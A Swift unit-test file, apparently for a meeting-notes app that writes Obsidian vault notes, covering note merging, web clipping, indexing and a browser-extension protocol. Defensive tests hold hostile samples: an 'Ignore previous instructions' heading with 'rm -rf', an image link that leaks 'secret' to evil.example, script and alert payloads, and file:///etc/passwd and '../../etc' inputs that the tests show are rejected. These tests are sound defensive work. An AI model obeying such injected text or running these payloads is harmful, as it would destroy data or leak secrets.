import CoreServices
import XCTest
@testable import WorkScribeCore

/// Golden files live in Tests/WorkScribeCoreTests/Golden. Run with WORKSCRIBE_UPDATE_GOLDEN=1 to rewrite them.
func assertGolden(_ actual: String, _ name: String, file: StaticString = #filePath, line: UInt = #line) throws {
    let source = URL(fileURLWithPath: "\(file)").deletingLastPathComponent().appendingPathComponent("Golden/\(name)")
    if ProcessInfo.processInfo.environment["WORKSCRIBE_UPDATE_GOLDEN"] == "1" {
        try actual.write(to: source, atomically: true, encoding: .utf8); return
    }
    let url = try XCTUnwrap(Bundle.module.url(forResource: name, withExtension: nil, subdirectory: "Golden"), file: file, line: line)
    XCTAssertEqual(actual, try String(contentsOf: url, encoding: .utf8), "golden \(name)", file: file, line: line)
}

func temporaryFolder(_ name: String = "vault") throws -> URL {
    let url = FileManager.default.temporaryDirectory.appendingPathComponent("ws-\(name)-\(UUID().uuidString.prefix(8))")
    try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
    return FileIdentity.url(url)
}

final class VaultWriterTests: XCTestCase {
    let utc = TimeZone(identifier: "UTC")!
    static let meetingID = "6F1C2B3A-1111-4222-8333-944455556666"

    static func sampleMeeting() -> Meeting {
        var meeting = Meeting(title: "Offline sync — v2.4 scope")
        meeting.id = Self.meetingID
        meeting.startedAt = Date(timeIntervalSince1970: 1_791_885_720)   // 2026-10-13 10:02 UTC
        meeting.endedAt = meeting.startedAt.addingTimeInterval(32 * 60)
        meeting.status = "complete"
        var s1 = Segment(source: "system", speaker: "system:speaker-1", start: 62, end: 70, text: "Field-level merge for checklists.")
        s1.id = "seg-a"
        var s2 = Segment(source: "system", speaker: "system:speaker-2", start: 1650, end: 1660, text: "Ship November fourth.")
        s2.id = "seg-b"
        var s3 = Segment(source: "microphone", speaker: "microphone:speaker-1", start: 10, end: 12, text: "Hi all.")
        s3.id = "seg-c"
        meeting.segments = [s1, s2, s3]
        meeting.speakerAssignments = ["system:speaker-1": SpeakerAssignment(name: "Priya Raman"),
                                      "system:speaker-2": SpeakerAssignment(name: "Marcus Chen"),
                                      "microphone:speaker-1": SpeakerAssignment(name: "You")]
        var n1 = Note(text: "conflict res - field lvl", createdAt: 70)
        n1.id = "N1"; n1.enhanced = "**Conflict resolution:** Field-level merge for checklists."; n1.excerptRefs = ["seg-a#0"]
        var n2 = Note(text: "ship nov 4", createdAt: 1660)
        n2.id = "N2"; n2.enhanced = "**Ship date:** Nov 4, not Oct 28."; n2.excerptRefs = ["seg-b#0", "seg-b#1"]
        meeting.notes = [n1, n2]
        meeting.missedTopics = [MissedTopic(topic: "Telemetry", text: "Marcus wants crash reporting before beta.", excerptRefs: ["seg-b#0"])]
        return meeting
    }

    static func sampleWriteUp() -> MeetingWriteUp {
        MeetingWriteUp(sampleMeeting(), brief: "Scope for v2.4 offline sync agreed; ship date moved to Nov 4.",
                       actions: [ActionItem(owner: "Priya Raman", text: "Update PRD v3", due: "2026-10-15"),
                                 ActionItem(owner: nil, text: "Book design review", done: true)],
                       customer: "Halvorsen Construction",
                       clips: [ClipLink(path: "Clippings/2026-10-13 Sync conflicts", title: "Sync conflicts | Docs", site: "docs.example.com", offset: 754)])
    }

    func testRenderGolden() throws {
        try assertGolden(VaultWriter.render(Self.sampleWriteUp(), timeZone: utc), "meeting-writeup.md")
    }

    func testRenderedNoteParsesBack() {
        let document = VaultDocument.parse(VaultWriter.render(Self.sampleWriteUp(), timeZone: utc))
        XCTAssertEqual(document.frontmatter["workscribe_id"], .string(Self.meetingID))
        XCTAssertEqual(document.frontmatter["date"], .string("2026-10-13"))
        XCTAssertEqual(document.frontmatter["duration"], .string("32m"))
        XCTAssertEqual(document.frontmatter["attendees"], .list(["[[People/Priya Raman]]", "[[People/Marcus Chen]]"]))
        XCTAssertEqual(document.frontmatter["recording"], .string("workscribe://meeting/\(Self.meetingID)"))
        XCTAssertEqual(document.title, "Offline sync — v2.4 scope")
        XCTAssertEqual(document.blockIDs, ["e1", "e2"])
        XCTAssertEqual(document.tasks.map(\.due), ["2026-10-15", nil])
        XCTAssertEqual(document.tasks.map(\.done), [false, true])
        XCTAssertTrue(document.links.contains(WikiLink(target: "People/Priya Raman")))
        XCTAssertNil(document.clipInfo(path: "Meetings/x.md"))
        // Excerpt links jump to the moment.
        XCTAssertTrue(document.urls.contains { $0.url == "workscribe://meeting/\(Self.meetingID)?t=1650.0&segment=seg-b" && $0.text == "27:30" })
    }

    func testBlockIDsStayWithTheirNotes() {
        var meeting = Self.sampleMeeting()
        let first = MeetingWriteUp(meeting)
        let remembered = Dictionary(uniqueKeysWithValues: first.notes.map { ($0.id, $0.blockID) })
        var added = Note(text: "new", createdAt: 5); added.id = "N0"
        meeting.notes = [added, meeting.notes![1]]   // a note inserted first, N1 removed
        let second = MeetingWriteUp(meeting, blockIDs: remembered)
        XCTAssertEqual(second.notes.map(\.blockID), ["e3", "e2"])
    }

    func testUnchangedMergeIsANoOp() {
        let text = VaultWriter.render(Self.sampleWriteUp(), timeZone: utc)
        let merge = VaultWriter.merge(existing: text, update: Self.sampleWriteUp(), timeZone: utc)
        XCTAssertFalse(merge.changed)
        XCTAssertEqual(merge.conflicts, [])
    }

    func testMergeUpdatesUneditedRegionsAndKeepsUserText() throws {
        var text = VaultWriter.render(Self.sampleWriteUp(), timeZone: utc)
        // The user adds a property, a paragraph between regions and text after everything.
        text = text.replacingOccurrences(of: "tags:\n  - meeting\n", with: "tags:\n  - meeting\nproject: \"[[Fieldbook]]\"\n")
        text = text.replacingOccurrences(of: "<!-- workscribe:begin notes -->", with: "My own aside.\n\n<!-- workscribe:begin notes -->")
        text += "\n## My follow-ups\n- call Priya\n"
        var update = Self.sampleWriteUp()
        update.title = "Offline sync scope"
        update.actions.append(ActionItem(owner: "Marcus Chen", text: "Draft telemetry plan", due: "2026-10-20"))
        update.duration = 33 * 60
        let merge = VaultWriter.merge(existing: text, update: update, timeZone: utc)
        XCTAssertEqual(merge.conflicts, [])
        XCTAssertTrue(merge.changed)
        XCTAssertTrue(merge.text.contains("# Offline sync scope\n"))
        XCTAssertTrue(merge.text.contains("- [ ] [[People/Marcus Chen]]: Draft telemetry plan 📅 2026-10-20"))
        XCTAssertTrue(merge.text.contains("duration: 33m"))
        XCTAssertTrue(merge.text.contains("project: \"[[Fieldbook]]\""))
        XCTAssertTrue(merge.text.contains("My own aside.\n\n<!-- workscribe:begin notes -->"))
        XCTAssertTrue(merge.text.hasSuffix("## My follow-ups\n- call Priya\n"))
        // And the result merges cleanly again.
        XCTAssertFalse(VaultWriter.merge(existing: merge.text, update: update, timeZone: utc).changed)
    }

    func testEditedRegionIsNeverOverwritten() {
        var text = VaultWriter.render(Self.sampleWriteUp(), timeZone: utc)
        text = text.replacingOccurrences(of: "Nov 4, not Oct 28.", with: "Nov 4 (confirmed with Halvorsen).")
        var update = Self.sampleWriteUp()
        update.notes[1].markdown = "**Ship date:** Nov 4."
        update.brief = "New brief."
        let merge = VaultWriter.merge(existing: text, update: update, timeZone: utc)
        XCTAssertEqual(merge.conflicts, ["notes"])
        XCTAssertTrue(merge.text.contains("Nov 4 (confirmed with Halvorsen)."))
        XCTAssertFalse(merge.text.contains("**Ship date:** Nov 4. "))
        XCTAssertTrue(merge.text.contains("## Brief\nNew brief."))
        // No new WorkScribe content for an edited region: no conflict either.
        XCTAssertEqual(VaultWriter.merge(existing: text, update: Self.sampleWriteUp(), timeZone: utc).conflicts, [])
    }

    func testEditedFrontmatterAndDeletedRegion() throws {
        var text = VaultWriter.render(Self.sampleWriteUp(), timeZone: utc)
        text = text.replacingOccurrences(of: "duration: 32m", with: "duration: 30m")
        let start = try XCTUnwrap(text.range(of: "<!-- workscribe:begin missed -->"))
        let end = try XCTUnwrap(text.range(of: #"<!-- workscribe:end missed [0-9a-f]+ -->\n"#, options: .regularExpression))
        text.removeSubrange(start.lowerBound..<end.upperBound)
        var update = Self.sampleWriteUp()
        update.attendees.append("Dana Ortiz")
        update.missed.append(.init(topic: "Pricing", text: "Not discussed in notes."))
        let merge = VaultWriter.merge(existing: text, update: update, timeZone: utc)
        XCTAssertEqual(merge.conflicts, ["frontmatter"])
        XCTAssertTrue(merge.text.contains("duration: 30m"))
        XCTAssertFalse(merge.text.contains("Dana Ortiz"))
        XCTAssertFalse(merge.text.contains("Missed topics"), "a deleted region stays deleted")
    }

    func testFrontmatterRoundTrip() {
        let yaml = """
        title: "A: quoted title"
        tags: [clippings, "web stuff"]
        attendees:
          - "[[People/Alex]]"
          - '[[People/O''Neil]]'
        time: "10:02"
        summary: |
          line one
          line two
        nested:
          key: value
        published: 2026-10-01 # a comment
        """
        let front = Frontmatter.parse(yaml)
        XCTAssertEqual(front["title"], .string("A: quoted title"))
        XCTAssertEqual(front["tags"], .list(["clippings", "web stuff"]))
        XCTAssertEqual(front["attendees"], .list(["[[People/Alex]]", "[[People/O'Neil]]"]))
        XCTAssertEqual(front["time"], .string("10:02"))
        XCTAssertEqual(front["summary"], .string("line one\nline two"))
        XCTAssertEqual(front["nested"], .string("key: value"))
        XCTAssertEqual(front["published"], .string("2026-10-01"))
        XCTAssertEqual(Frontmatter.parse(front.render()), front)
        XCTAssertEqual(Frontmatter.scalar("10:02"), "\"10:02\"")
        XCTAssertEqual(Frontmatter.scalar("[[People/Alex]]"), "\"[[People/Alex]]\"")
        XCTAssertEqual(Frontmatter.scalar("2026-10-13"), "2026-10-13")
    }
}

final class VaultStoreTests: XCTestCase {
    let utc = TimeZone(identifier: "UTC")!

    func makeStore() throws -> VaultStore {
        let root = try temporaryFolder()
        try FileManager.default.createDirectory(at: root.appendingPathComponent(".obsidian"), withIntermediateDirectories: true)
        try "{\"theme\":\"moonstone\"}".write(to: root.appendingPathComponent(".obsidian/app.json"), atomically: true, encoding: .utf8)
        return VaultStore(root: root, stateDirectory: try temporaryFolder("state"), timeZone: utc)
    }

    func testWritesMeetingPeopleAndUpdatesInPlace() throws {
        let store = try makeStore()
        let writeUp = VaultWriterTests.sampleWriteUp()
        let created = try store.writeMeeting(writeUp)
        XCTAssertEqual(created, .created("Meetings/2026-10-13 Offline sync — v2.4 scope.md"))
        XCTAssertTrue(FileManager.default.fileExists(atPath: store.url("People/Priya Raman.md").path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: store.url("People/Marcus Chen.md").path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: store.url("People/You.md").path))

        // People pages are never modified once they exist.
        try "# Priya\nPM at Fieldbook\n".write(to: store.url("People/Priya Raman.md"), atomically: true, encoding: .utf8)
        var update = writeUp
        update.brief = "Updated."
        XCTAssertEqual(try store.writeMeeting(update), .updated(created.path))
        XCTAssertEqual(try String(contentsOf: store.url("People/Priya Raman.md"), encoding: .utf8), "# Priya\nPM at Fieldbook\n")
        XCTAssertEqual(try store.writeMeeting(update), .unchanged(created.path))
        XCTAssertEqual(try String(contentsOf: store.url(".obsidian/app.json"), encoding: .utf8), "{\"theme\":\"moonstone\"}")
        XCTAssertEqual(store.obsidianURL(created.path)?.absoluteString,
                       "obsidian://open?vault=\(store.name)&file=Meetings%2F2026-10-13%20Offline%20sync%20%E2%80%94%20v2.4%20scope")
        let leftovers = try FileManager.default.contentsOfDirectory(atPath: store.url("Meetings").path).filter { $0.hasSuffix(".tmp") }
        XCTAssertEqual(leftovers, [])
    }

    func testConflictWritesSiblingAndFollowsRenames() throws {
        let store = try makeStore()
        var writeUp = VaultWriterTests.sampleWriteUp()
        let path = try store.writeMeeting(writeUp).path
        // The user renames the note in Obsidian and edits the notes.
        let renamed = "Meetings/Fieldbook sync.md"
        try FileManager.default.moveItem(at: store.url(path), to: store.url(renamed))
        var text = try String(contentsOf: store.url(renamed), encoding: .utf8)
        text = text.replacingOccurrences(of: "Field-level merge for checklists.", with: "Field-level merge (my wording).")
        try text.write(to: store.url(renamed), atomically: true, encoding: .utf8)

        writeUp.notes[0].markdown = "**Conflict resolution:** Field-level merge, last writer wins on text."
        writeUp.brief = "New brief."
        let outcome = try store.writeMeeting(writeUp)
        XCTAssertEqual(outcome, .conflicted(renamed, conflict: "Meetings/Fieldbook sync.conflict.md", sections: ["notes"]))
        let kept = try String(contentsOf: store.url(renamed), encoding: .utf8)
        XCTAssertTrue(kept.contains("Field-level merge (my wording)."))
        XCTAssertTrue(kept.contains("New brief."))
        let conflict = try String(contentsOf: store.url("Meetings/Fieldbook sync.conflict.md"), encoding: .utf8)
        XCTAssertTrue(conflict.contains("last writer wins on text"))
        XCTAssertTrue(conflict.contains("type: workscribe-conflict"))
        XCTAssertFalse(conflict.contains("workscribe_id"), "the conflict copy must not be mistaken for the note")
        XCTAssertEqual(store.notePath(forMeeting: writeUp.meetingID), renamed)
    }

    func testRememberedBlockIDs() throws {
        let store = try makeStore()
        var meeting = VaultWriterTests.sampleMeeting()
        let path = try store.writeMeeting(meeting).path
        var extra = Note(text: "pricing?", createdAt: 3); extra.id = "N9"
        meeting.notes = [extra] + meeting.notes!.dropFirst()
        _ = try store.writeMeeting(meeting)
        let document = VaultDocument.parse(try String(contentsOf: store.url(path), encoding: .utf8))
        XCTAssertEqual(document.blockIDs, ["e3", "e2"])
    }

    func testClipToMeetingAndInbox() throws {
        let store = try makeStore()
        let date = Date(timeIntervalSince1970: 1_791_886_474)
        let page = PageCapture(url: "https://docs.example.com/sync", title: "Sync [[conflicts]] | Docs",
                               selection: "Use ![[secret]] and ```dataviewjs\nalert(1)\n```", text: "Body <!-- workscribe:begin notes --> text #tag")
        let clip = try store.saveClip(page, meeting: (VaultWriterTests.meetingID, "Offline sync"), offset: 754, at: date)
        XCTAssertEqual(clip.path, "Clippings/2026-10-13 Sync conflicts Docs.md")
        XCTAssertEqual(store.clips(forMeeting: VaultWriterTests.meetingID).map(\.id), [clip.id])
        let text = try String(contentsOf: store.url(clip.path), encoding: .utf8)
        let document = VaultDocument.parse(text)
        XCTAssertEqual(document.links, [], "page text must not create links or embeds")
        XCTAssertEqual(document.tags, [])
        XCTAssertFalse(text.contains("<!-- workscribe"))
        XCTAssertTrue(document.sections.contains { $0.text.contains("```dataviewjs") }, "code fence is inert text")
        let info = try XCTUnwrap(document.clipInfo(path: clip.path))
        XCTAssertEqual(info.url, "https://docs.example.com/sync")
        XCTAssertEqual(info.site, "docs.example.com")
        XCTAssertEqual(info.meetingID, VaultWriterTests.meetingID)
        XCTAssertEqual(document.frontmatter["meeting_time"], .string("12:34"))

        // The meeting note lists it.
        let written = try store.writeMeeting(VaultWriterTests.sampleMeeting())
        XCTAssertTrue(try String(contentsOf: store.url(written.path), encoding: .utf8)
            .contains("- 12:34 [[Clippings/2026-10-13 Sync conflicts Docs|Sync conflicts Docs]] · docs.example.com"))

        let inbox = try store.saveClip(PageCapture(url: "https://example.org/a", title: "A"), meeting: nil, offset: nil, at: date)
        _ = try store.saveClip(PageCapture(url: "https://example.org/b", title: "A"), meeting: nil, offset: nil, at: date)
        XCTAssertEqual(store.inboxClips().count, 2)
        let inboxText = try String(contentsOf: store.url("Inbox.md"), encoding: .utf8)
        XCTAssertTrue(inboxText.contains("[[\(inbox.link.path)|A]] · example.org"))
        XCTAssertTrue(inboxText.contains("[[Clippings/2026-10-13 A (2)|A]]"))
    }
}

final class MarkdownParserTests: XCTestCase {
    func testStructure() {
        let text = """
        ---
        type: note
        tags: [project]
        ---
        # Launch plan
        Intro with [[People/Alex|Alex]] and [[Roadmap#Q4]] and [[Specs#^b12]] plus ![[diagram.png]] and ![[Snippet]].
        A ==key point== and [the docs](https://example.com/docs) #launch #2026 and an [[unclosed link.
        <!-- workscribe:begin notes -->
        %% hidden %%
        ## Tasks ^head1
        - [ ] Send forecast 📅 2026-10-16
        - [x] Draft email due:: 2026-10-01
        - [ ] Item with block ^t1
        > [!warning] Risky
        > Read [[Risks]] first
        > ==quoted highlight==
        Plain after callout.
        ```js
        const x = "[[not a link]] ==not== #nottag"
        ```
        > ordinary quote
        """
        let document = VaultDocument.parse(text)
        XCTAssertEqual(document.frontmatter["type"], .string("note"))
        XCTAssertEqual(document.title, "Launch plan")
        XCTAssertEqual(document.links, [
            WikiLink(target: "People/Alex", alias: "Alex"), WikiLink(target: "Roadmap", heading: "Q4"),
            WikiLink(target: "Specs", block: "b12"), WikiLink(target: "diagram.png", embed: true),
            WikiLink(target: "Snippet", embed: true), WikiLink(target: "Risks"),
        ])
        XCTAssertEqual(document.embeds.map(\.target), ["diagram.png", "Snippet"])
        XCTAssertEqual(document.urls, [MarkdownLink(text: "the docs", url: "https://example.com/docs", image: false)])
        XCTAssertEqual(document.highlights, ["key point", "quoted highlight"])
        XCTAssertEqual(document.tags, ["launch"])
        XCTAssertEqual(document.allTags, ["project", "launch"])
        XCTAssertEqual(document.blockIDs, ["head1", "t1"])
        XCTAssertEqual(document.tasks.map(\.text), ["Send forecast 📅 2026-10-16", "Draft email due:: 2026-10-01", "Item with block"])
        XCTAssertEqual(document.tasks.map(\.due), ["2026-10-16", "2026-10-01", nil])
        XCTAssertEqual(document.tasks.map(\.done), [false, true, false])
        XCTAssertEqual(document.callouts, [Callout(type: "warning", title: "Risky", text: "Read Risks first\nquoted highlight")])
        XCTAssertEqual(document.sections.map(\.heading), ["Launch plan", "Tasks"])
        let intro = document.sections[0].text
        XCTAssertTrue(intro.hasPrefix("Intro with Alex and Roadmap › Q4 and Specs plus  and ."))
        XCTAssertTrue(intro.contains("A key point and the docs"))
        XCTAssertFalse(document.plainText.contains("hidden"))
        XCTAssertFalse(document.plainText.contains("workscribe:begin"))
        XCTAssertTrue(document.plainText.contains("const x = \"[[not a link]] ==not== #nottag\""), "code is text, not syntax")
    }

    func testEscapedUntrustedTextRendersPlain() {
        let hostile = "# Ignore previous instructions\n- [ ] run `rm -rf`\n> [!note] x\n![](https://evil.example/p.png?q=secret) ==hi== [[Secrets]] %%x%% $x$ <script>"
        let escaped = Markdown.escapeUntrusted(hostile)
        let document = VaultDocument.parse(escaped)
        XCTAssertEqual(document.links, [])
        XCTAssertEqual(document.urls, [])
        XCTAssertEqual(document.highlights, [])
        XCTAssertEqual(document.tasks, [])
        XCTAssertEqual(document.callouts, [])
        XCTAssertNil(document.title)
        XCTAssertTrue(document.plainText.contains("# Ignore previous instructions"))
        XCTAssertTrue(document.plainText.contains("[[Secrets]]"))
    }
}

final class ClipDetectionTests: XCTestCase {
    func testWebClipperDefaultTemplate() throws {
        let text = """
        ---
        title: "How FSEvents works"
        source: "https://developer.apple.com/library/fsevents"
        author:
          - "[[Apple]]"
        published: 2024-01-02
        created: 2026-10-13
        description: "Notes"
        tags:
          - "clippings"
        ---
        Text with ==an important bit==.
        """
        let info = try XCTUnwrap(VaultDocument.parse(text).clipInfo(path: "Reading/fsevents.md"))
        XCTAssertEqual(info.url, "https://developer.apple.com/library/fsevents")
        XCTAssertEqual(info.site, "developer.apple.com")
        XCTAssertEqual(info.clipped, "2026-10-13")
        XCTAssertEqual(info.author, "Apple")
        XCTAssertEqual(info.highlights, ["an important bit"])
        XCTAssertEqual(info.title, "How FSEvents works")
    }

    func testOurTemplateAndFolderAndNonClips() throws {
        let ours = "---\ntype: clip\nurl: https://www.example.com/x\nsite: Example\nclipped: 2026-10-13T10:00:00Z\nhighlights:\n  - first\n---\nbody ==second=="
        let info = try XCTUnwrap(VaultDocument.parse(ours).clipInfo(path: "Notes/x.md"))
        XCTAssertEqual(info.site, "Example")
        XCTAssertEqual(info.highlights, ["first", "second"])
        XCTAssertNotNil(VaultDocument.parse("# Saved by hand\n").clipInfo(path: "Clippings/Saved.md"))
        XCTAssertNil(VaultDocument.parse("---\ntype: meeting\nsource: https://zoom.us/j/1\n---\n").clipInfo(path: "Clippings/m.md"))
        XCTAssertNil(VaultDocument.parse("---\ntype: project\nurl: https://example.com\n---\n").clipInfo(path: "Projects/p.md"))
        XCTAssertNil(VaultDocument.parse("---\nsource: ftp://example.com\n---\n").clipInfo(path: "a.md"))
        XCTAssertNotNil(VaultDocument.parse("---\nsource: https://example.com\n---\n").clipInfo(path: "a.md"))
    }
}

final class VaultIndexerTests: XCTestCase {
    func testIndexesNotesClipsAndEmbedsOneLevel() async throws {
        let vault = try temporaryFolder()
        let files: [String: String] = [
            ".obsidian/workspace.json": "{\"secret\": \"zebra\"}",
            "Clippings/Pricing.md": "---\ntitle: Competitor pricing\nsource: https://www.rival.com/pricing\ncreated: 2026-10-12\ntags: [clippings]\n---\nTheir ==enterprise tier is per seat==. Quokka plans.",
            "Projects/Plan.md": "# Plan\nRoadmap overview.\n![[Snippet]]",
            "Snippet.md": "Snippet mentions narwhal.\n![[Deep]]",
            "Deep.md": "Deep note mentions axolotl.",
            "Meetings/Old.conflict.md": "conflict copy walrus",
            ".trash/Gone.md": "trashed platypus",
        ]
        for (path, text) in files {
            let url = vault.appendingPathComponent(path)
            try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
            try text.write(to: url, atomically: true, encoding: .utf8)
        }
        let index = try SearchIndex(url: try temporaryFolder("index").appendingPathComponent("index.sqlite"))
        let indexer = VaultIndexer(index: index, embedder: nil)
        let report = try await indexer.sync(vault: vault)
        XCTAssertEqual(report.indexed, 4)

        let clip = try XCTUnwrap(index.search(SearchRequest("quokka")).hits.first)
        XCTAssertEqual(clip.kind, .clip)
        XCTAssertEqual(clip.sourceKind, .vault)
        XCTAssertEqual(clip.title, "Competitor pricing")
        XCTAssertEqual(clip.meta["url"], "https://www.rival.com/pricing")
        XCTAssertEqual(clip.meta["site"], "rival.com")
        XCTAssertEqual(clip.meta["clipped"], "2026-10-12")
        XCTAssertEqual(clip.meta["highlights"], "enterprise tier is per seat")
        XCTAssertEqual(clip.obsidianURL?.absoluteString, "obsidian://open?vault=\(vault.lastPathComponent)&file=Clippings%2FPricing")
        XCTAssertEqual(try index.search(SearchRequest("clips quokka", kinds: [.clip])).hits.count, 1)

        let plan = try index.search(SearchRequest("narwhal")).hits.map { $0.meta["path"] }
        XCTAssertEqual(Set(plan.compactMap { $0 }), ["Projects/Plan.md", "Snippet.md"], "embed folded into Plan")
        let deep = try index.search(SearchRequest("axolotl")).hits.compactMap { $0.meta["path"] }
        XCTAssertEqual(Set(deep), ["Deep.md", "Snippet.md"], "embeds are not followed recursively")
        for word in ["zebra", "walrus", "platypus"] { XCTAssertEqual(try index.search(SearchRequest(word)).hits.count, 0, word) }

        // Incremental: an edit and a delete.
        try "# Plan\nNow about kangaroos.".write(to: vault.appendingPathComponent("Projects/Plan.md"), atomically: true, encoding: .utf8)
        try FileManager.default.removeItem(at: vault.appendingPathComponent("Clippings/Pricing.md"))
        let changed = try await indexer.update(paths: [vault.appendingPathComponent("Projects/Plan.md").path,
                                                       vault.appendingPathComponent("Clippings/Pricing.md").path,
                                                       vault.appendingPathComponent(".obsidian/workspace.json").path], vault: vault)
        XCTAssertEqual(changed.indexed, 1); XCTAssertEqual(changed.removed, 1)
        XCTAssertEqual(try index.search(SearchRequest("kangaroos")).hits.count, 1)
        XCTAssertEqual(try index.search(SearchRequest("quokka")).hits.count, 0)
        XCTAssertEqual(try index.meta(ref: vault.appendingPathComponent("Clippings/Pricing.md").path), [:])
        let again = try await indexer.sync(vault: vault)
        XCTAssertEqual(again.unchanged, 3)
    }

    func testWatcherReportsChangesAndRescans() throws {
        XCTAssertNotNil(VaultWatcher.rescanReason(FSEventStreamEventFlags(kFSEventStreamEventFlagMustScanSubDirs)))
        XCTAssertNotNil(VaultWatcher.rescanReason(FSEventStreamEventFlags(kFSEventStreamEventFlagKernelDropped)))
        XCTAssertNotNil(VaultWatcher.rescanReason(FSEventStreamEventFlags(kFSEventStreamEventFlagRootChanged)))
        XCTAssertNil(VaultWatcher.rescanReason(FSEventStreamEventFlags(kFSEventStreamEventFlagItemModified | kFSEventStreamEventFlagItemIsFile)))
        XCTAssertEqual(VaultWatcher.Checkpoint("ABC-1:42"), VaultWatcher.Checkpoint(device: "ABC-1", eventID: 42))

        let vault = try temporaryFolder()
        let lock = NSLock()
        var changes: [VaultWatcher.Change] = []
        let rescan = expectation(description: "first watch rescans"), edited = expectation(description: "edit reported")
        let watcher = VaultWatcher(root: vault, debounce: 0.3) { change in
            lock.withLock { changes.append(change) }
            switch change {
            case .rescan: rescan.fulfill()
            case .paths(let paths, _): if paths.contains(where: { $0.hasSuffix("/Note.md") }) { edited.fulfill() }
            }
        }
        watcher.start(since: nil)
        wait(for: [rescan], timeout: 10)
        try FileManager.default.createDirectory(at: vault.appendingPathComponent(".obsidian"), withIntermediateDirectories: true)
        try "x".write(to: vault.appendingPathComponent(".obsidian/app.json"), atomically: true, encoding: .utf8)
        try "hello".write(to: vault.appendingPathComponent("Note.md"), atomically: false, encoding: .utf8)
        wait(for: [edited], timeout: 15)
        watcher.stop()
        let all = lock.withLock { changes }
        XCTAssertFalse(all.contains { if case .paths(let p, _) = $0 { p.contains { $0.contains(".obsidian") } } else { false } })
        XCTAssertGreaterThan(all.last!.checkpoint.eventID, 0)
    }
}

final class ClipProtocolTests: XCTestCase {
    let id = "0B7A1E44-5D2B-4C39-9E1A-2D7F0C3B9A11"
    func request(_ body: [String: Any]) -> Data { try! JSONSerialization.data(withJSONObject: body) }
    func clip(page: [String: Any] = ["url": "https://example.com/a", "title": "A"], extra: [String: Any] = [:]) -> [String: Any] {
        ["v": 1, "id": id, "type": "clip", "page": page].merging(extra) { _, b in b }
    }

    func testValidRequests() throws {
        let status = try ClipProtocol.validate(request(["v": 1, "id": id, "type": "status"]))
        XCTAssertEqual(status.type, .status); XCTAssertNil(status.page)
        let full = try ClipProtocol.validate(request(clip(page: [
            "url": "https://user:pw@www.youtube.com/watch?v=x", "title": "Talk\u{0007}", "selection": "line\nnext\u{202E}",
            "text": NSNull(), "videoTime": 754.5, "site": "YouTube",
        ], extra: ["meetingId": VaultWriterTests.meetingID, "question": "Summarize"])))
        XCTAssertEqual(full.page?.url, "https://www.youtube.com/watch?v=x", "credentials stripped")
        XCTAssertEqual(full.page?.title, "Talk", "control characters removed")
        XCTAssertEqual(full.page?.selection, "line\nnext", "bidi overrides removed")
        XCTAssertEqual(full.page?.videoTime, 754.5)
        XCTAssertNil(full.page?.text)
        XCTAssertEqual(full.meetingId, VaultWriterTests.meetingID)
    }

    func testRejectsBadRequests() {
        func rejects(_ data: Data, _ expected: ClipProtocol.Invalid, line: UInt = #line) {
            XCTAssertThrowsError(try ClipProtocol.validate(data), line: line) { XCTAssertEqual($0 as? ClipProtocol.Invalid, expected, line: line) }
        }
        rejects(Data("[1]".utf8), .notJSON)
        rejects(Data(repeating: 32, count: ClipProtocol.maxRequestBytes + 1), .tooLarge(ClipProtocol.maxRequestBytes + 1))
        rejects(request(clip(extra: ["command": "delete"])), .unknownField("command"))
        rejects(request(clip(page: ["url": "https://a.com", "title": "x", "script": "y"])), .unknownField("page.script"))
        rejects(request(clip(extra: ["v": 2])), .version(2))
        rejects(request(clip(extra: ["id": "../../etc"])), .id)
        rejects(request(clip(extra: ["type": "delete"])), .type)
        rejects(request(["v": 1, "id": id, "type": "clip"]), .missingPage)
        rejects(request(clip(page: ["url": "javascript:alert(1)", "title": "x"])), .url("must be http or https"))
        rejects(request(clip(page: ["url": "file:///etc/passwd", "title": "x"])), .url("must be http or https"))
        rejects(request(clip(page: ["url": "https://a.com", "title": String(repeating: "x", count: 1001)])), .tooLong("title"))
        rejects(request(clip(page: ["url": "https://a.com", "title": "x", "videoTime": -1])), .number("videoTime"))
        rejects(request(clip(page: ["url": "https://a.com", "title": "x", "videoTime": "12"])), .number("videoTime"))
        rejects(request(clip(page: ["url": "https://a.com", "title": 5])), .tooLong("title"))
        rejects(request(clip(extra: ["meetingId": "abc"])), .meetingID)
    }

    func testOrigins() throws {
        let allowed = ClipProtocol.defaultAllowedOrigins
        XCTAssertTrue(ClipProtocol.originAllowed("chrome-extension://\(ClipProtocol.extensionID)/", allowed: allowed))
        XCTAssertTrue(ClipProtocol.originAllowed("chrome-extension://\(ClipProtocol.extensionID)", allowed: allowed))
        XCTAssertFalse(ClipProtocol.originAllowed("chrome-extension://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/", allowed: allowed))
        XCTAssertFalse(ClipProtocol.originAllowed(nil, allowed: allowed))
        let file = try temporaryFolder("origins").appendingPathComponent("allowed-origins.txt")
        try "# dev build\nchrome-extension://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/\nhttps://evil.example/\nchrome-extension://short/\n".write(to: file, atomically: true, encoding: .utf8)
        XCTAssertEqual(ClipProtocol.allowedOrigins(file: file),
                       allowed.union(["chrome-extension://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/"]))
    }

    func testFraming() throws {
        var fds: [Int32] = [0, 0]
        XCTAssertEqual(pipe(&fds), 0)
        try ClipFraming.write(fd: fds[1], Data("{\"a\":1}".utf8))
        XCTAssertEqual(ClipFraming.frame(Data("ab".utf8)), Data([2, 0, 0, 0, 97, 98]))
        XCTAssertEqual(try ClipFraming.read(fd: fds[0], limit: 100), Data("{\"a\":1}".utf8))
        var big = UInt32(500).littleEndian
        _ = withUnsafeBytes(of: &big) { Darwin.write(fds[1], $0.baseAddress, 4) }
        XCTAssertThrowsError(try ClipFraming.read(fd: fds[0], limit: 100)) { XCTAssertEqual($0 as? ClipFraming.Failure, .tooLarge(500)) }
        close(fds[1])
        XCTAssertThrowsError(try ClipFraming.read(fd: fds[0], limit: 100)) { XCTAssertEqual($0 as? ClipFraming.Failure, .closed) }
        close(fds[0])
    }

    func testSocketRoundTrip() throws {
        let path = "/tmp/ws-clip-\(UUID().uuidString.prefix(8)).sock"
        let server = ClipSocketServer(path: path) { request in
            ClipResponse(id: request.id, ok: true, destination: .init(kind: "inbox", title: "Inbox"), vault: request.page?.title)
        }
        try server.start()
        defer { server.stop() }
